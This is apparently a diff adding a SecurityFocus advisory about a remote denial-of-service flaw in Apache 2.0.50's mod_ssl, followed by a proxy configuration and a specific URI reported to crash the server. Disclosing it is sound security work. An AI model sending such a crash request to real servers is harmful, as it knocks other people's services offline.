@@ -1,0 +1,16 @@
+source: http://www.securityfocus.com/bid/11154/info
+
+Apache 2.x mod_ssl is reported prone to a remote denial of service vulnerability. This issue likely exists because the application fails to handle exceptional conditions. The vulnerability originates in the 'char_buffer_read' function of the 'ssl_engine_io.c' file. 
+
+It is likely that this issue only results in a denial of service condition in child process. This BID will be updated as more information becomes available.
+
+Apache 2.0.50 is reported to be affected by this issue, however, it is possible that other versions are vulnerable as well.
+
+With the following configuration in httpd.conf:
+Listen 47290
+SSLProxyEngine on
+RewriteEngine on
+RewriteRule /(.*) https://www.example.com/$1 [P]
+
+The server may be crashed by issuing the following URI:
+http://www.example.com:47290/eRoomASP/CookieTest.asp?facility=facility&URL=%2FeRoom%2FFacility%2FRoom%2F0_4242
